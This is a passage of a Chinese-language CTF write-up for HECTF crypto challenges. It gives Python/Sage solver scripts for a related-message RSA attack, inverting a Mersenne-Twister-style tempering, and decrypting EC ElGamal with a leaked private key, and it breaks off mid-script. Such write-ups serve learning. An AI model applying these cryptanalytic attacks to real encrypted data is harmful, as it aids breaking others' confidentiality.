number\">23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token number\">5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>c2 <span class=\"token operator\">=</span> <span class=\"token number\">17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">30509</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13601</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">92095</span><span class=\"token punctuation\">,</span> <span class=\"token number\">27065</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">17</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> c2<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>m<span class=\"token operator\">>=</span>PolynomialRing<span class=\"token punctuation\">(</span>Zmod<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    g1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>m<span class=\"token operator\">+</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>e <span class=\"token operator\">-</span> c1</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    g2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>m<span class=\"token operator\">+</span>y<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>e <span class=\"token operator\">-</span> c2</pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">gcd</span><span class=\"token punctuation\">(</span>g1<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">while</span> g2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            g1<span class=\"token punctuation\">,</span> g2 <span class=\"token operator\">=</span> g2<span class=\"token punctuation\">,</span> g1 <span class=\"token operator\">%</span> g2</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">return</span> g1<span class=\"token punctuation\">.</span>monic<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span>gcd<span class=\"token punctuation\">(</span>g1<span class=\"token punctuation\">,</span> g2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>m <span class=\"token operator\">=</span> attack<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"我们仨\"><a class=\"markdownIt-Anchor\" href=\"#我们仨\">#</a> 我们仨</h3>\n<p>第一部分参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01pa2VDb2tlL2FydGljbGUvZGV0YWlscy8xMTM3OTAwNTI=\"> ACTF</span>，第二部分是个多因子 rsa，第三部分用在线站点解密即可。</p>\n<p><img data-src=\"./HECTF/2902310-20231119220322681-47811377.png\" alt=\"image\"></p>\n<h3 id=\"littleblock\"><a class=\"markdownIt-Anchor\" href=\"#littleblock\">#</a> littleblock</h3>\n<p>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01pa2VDb2tlL2FydGljbGUvZGV0YWlscy8xMTM3OTU1NDg=\"> MT</span> 改改 exp 就好。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">circular_shift_left</span><span class=\"token punctuation\">(</span>int_value<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> bit<span class=\"token operator\">=</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    bin_value <span class=\"token operator\">=</span> <span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>int_value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    bin_value <span class=\"token operator\">=</span> bin_value<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> bin_value<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>k<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    int_value <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>bin_value<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> int_value</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_right</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> shift<span class=\"token punctuation\">,</span> bits<span class=\"token operator\">=</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    tmp <span class=\"token operator\">=</span> res</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>bits <span class=\"token operator\">//</span> shift<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        tmp <span class=\"token operator\">=</span> res <span class=\"token operator\">^</span> tmp <span class=\"token operator\">>></span> shift</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># right shift with mask inverse</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_right_mask</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> shift<span class=\"token punctuation\">,</span> mask<span class=\"token punctuation\">,</span> bits<span class=\"token operator\">=</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    tmp <span class=\"token operator\">=</span> res</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>bits <span class=\"token operator\">//</span> shift<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        tmp <span class=\"token operator\">=</span> res <span class=\"token operator\">^</span> tmp <span class=\"token operator\">>></span> shift <span class=\"token operator\">&amp;</span> mask</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\"># left shift inverse</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_left</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> shift<span class=\"token punctuation\">,</span> bits<span class=\"token operator\">=</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    tmp <span class=\"token operator\">=</span> res</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>bits <span class=\"token operator\">//</span> shift<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        tmp <span class=\"token operator\">=</span> res <span class=\"token operator\">^</span> tmp <span class=\"token operator\">&lt;&lt;</span> shift</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># left shift with mask inverse</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">inverse_left_mask</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> shift<span class=\"token punctuation\">,</span> mask<span class=\"token punctuation\">,</span> bits<span class=\"token operator\">=</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    tmp <span class=\"token operator\">=</span> res</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>bits <span class=\"token operator\">//</span> shift<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        tmp <span class=\"token operator\">=</span> res <span class=\"token operator\">^</span> tmp <span class=\"token operator\">&lt;&lt;</span> shift <span class=\"token operator\">&amp;</span> mask</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">return</span> tmp</pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reconvert</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    y <span class=\"token operator\">=</span> inverse_right<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    y <span class=\"token operator\">=</span> inverse_left_mask<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span><span class=\"token number\">17</span><span class=\"token punctuation\">,</span><span class=\"token number\">2245263360</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    y <span class=\"token operator\">=</span> inverse_left_mask<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span class=\"token punctuation\">,</span><span class=\"token number\">2029229568</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    y <span class=\"token operator\">=</span> inverse_right<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">return</span> y<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffffffff</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dec</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    block <span class=\"token operator\">^</span><span class=\"token operator\">=</span>b</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    block <span class=\"token operator\">=</span> circular_shift_left<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    block <span class=\"token operator\">^</span><span class=\"token operator\">=</span> a</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">return</span> block</pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">1909693462</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">3279553481</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token string\">b'\\xa1\\x14\\xa66\\x9c\\x88\\xe3\\xeco?\\xe2\\x95\\xbd\\xcd\\x1a2)i\\xf5_)\\x15H\\xf2y\\xec\\x8d\\xfc*KU\\xefv\\xdd\\xd0X'</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    new_message <span class=\"token operator\">=</span> <span class=\"token string\">b''</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    IV <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span><span class=\"token string\">b'retu'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        block <span class=\"token operator\">=</span> message<span class=\"token punctuation\">[</span>i <span class=\"token operator\">*</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">:</span> i <span class=\"token operator\">*</span> <span class=\"token number\">4</span> <span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        block <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        block <span class=\"token operator\">=</span> block <span class=\"token operator\">^</span> IV</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        IV <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>message<span class=\"token punctuation\">[</span>i <span class=\"token operator\">*</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">:</span> i <span class=\"token operator\">*</span> <span class=\"token number\">4</span> <span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        block <span class=\"token operator\">=</span> dec<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        block <span class=\"token operator\">=</span> reconvert<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        block <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        new_message <span class=\"token operator\">+=</span> block</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token keyword\">return</span> new_message</pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>transform<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"easyecc\"><a class=\"markdownIt-Anchor\" href=\"#easyecc\">#</a> easyecc</h3>\n<p>首先 key.d 是私钥可以导入 pem 文件得到：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>PublicKey <span class=\"token keyword\">import</span> ECC</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>key <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pem.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>ec <span class=\"token operator\">=</span> ECC<span class=\"token punctuation\">.</span>import_key<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>k <span class=\"token operator\">=</span> ec<span class=\"token punctuation\">.</span>d</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>点 G 同样可以直接调库得到，那么只要能搞到 <code>NIST P-256</code>  这条曲线就能利用私钥求出 M，这种工作可以让 chatgpt 完成：</p>\n<p><img data-src=\"./HECTF/2902310-20231119225240013-471778336.png\" alt=\"image\"><br>\n 最后解一下 rsa 就得到 flag 了，贴一下主要的 exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">340411986008332622492252515156919590702658555525072399052451683041772652474839788525448087771416400264570261404595656046016551644464496921197111421138765</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">71430232672331113271988412132459391678542075997754159037222774180961171917977</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">62238630405406252154015032808640586594811636815028129383858020738965206372881</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">25742109236464952840117078659367834030129507446418393682693133323915430074859</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">65657711071079869088595294059522027768683424454908946840021611773238453793364</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token number\">73644752642842712320035434881783031141060118592034523842277486117853194541614</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># M = c1 - kc2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>G <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">56822311642422761878729794693228467752083233270243163587743548931098783532793</span><span class=\"token punctuation\">,</span> <span class=\"token number\">97861625365183872310967809084381216603394130591639593718920295858062599887340</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">from</span> sage<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 定义 NIST256p 的参数</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">41058363725152142129326129780047268409114441015993725554835256314039467401291</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 创建椭圆曲线</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>E <span class=\"token operator\">=</span> EllipticCurve<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># 创建生成点</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>G <span class=\"token operator\">=</span> E<span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> G<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#print(G.order())</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 输出椭圆曲线和生成点</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>E<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>M <span class=\"token operator\">=</span> E<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> k<span class=\"token operator\">*</span>E<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>M<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"nextnext\"><a class=\"markdownIt-Anchor\" href=\"#nextnext\">#</a> nextnext</h3>\n<p>主要就是分析下面这个函数：</p>\n<p><img data-src=\"./HECTF/2902310-20231119225855692-1609352802.png\" alt=\"image\"><br>\n 这里通过 g 直接得到 a 和 b，然后利用 p q 十进制字符相反这一关联去做剪枝分解 N，然后把 seed 求出来。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> sympy <span class=\"token keyword\">import</span> nextprime<span class=\"token punctuation\">,</span>prevprime</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gen_parameter</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    seed <span class=\"token operator\">=</span> s</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    p <span class=\"token operator\">=</span> nextprime<span class=\"token punctuation\">(</span>seed <span class=\"token operator\">*</span> <span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    q <span class=\"token operator\">=</span> nextprime<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    a <span class=\"token operator\">=</span> nextprime<span class=\"token punctuation\">(</span>p<span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    b <span class=\"token operator\">=</span> nextprime<span class=\"token punctuation\">(</span>q<span class=\"token operator\">%</span><span class=\"token 